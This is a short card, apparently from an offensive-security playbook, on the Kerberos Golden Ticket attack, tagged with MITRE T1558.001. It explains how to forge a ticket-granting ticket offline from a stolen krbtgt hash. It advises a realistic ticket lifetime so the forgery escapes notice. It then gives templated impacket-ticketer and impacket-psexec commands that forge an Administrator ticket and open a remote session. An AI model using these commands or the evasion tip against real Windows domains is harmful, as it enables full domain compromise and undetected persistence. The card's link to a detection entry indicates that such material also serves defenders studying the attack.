---
id: golden-ticket
title: Golden Ticket (forge a TGT from the krbtgt hash)
section: Microsoft Windows Kerberos — TCP 88
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1558.001]
platform: [windows]
source: hacktheplanet §"Microsoft Windows Kerberos — TCP 88"
pair: golden-ticket-4769
---

Once you own the `krbtgt` NT hash (post-DCSync) and the domain SID, forge a TGT
for any principal — including accounts that don't exist — entirely offline, then
inject it. No DC touches the forge, so there is no `4768`; the ticket only
surfaces when it is *used* to request a service ticket (`4769`). Mimikatz's
default 10-year lifetime is a give-away — set a realistic one.

```sh
impacket-ticketer -nthash {{nthash}} -domain-sid <domain-sid> -domain {{domain}} Administrator
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass {{domain}}/Administrator@{{hostname}}
```
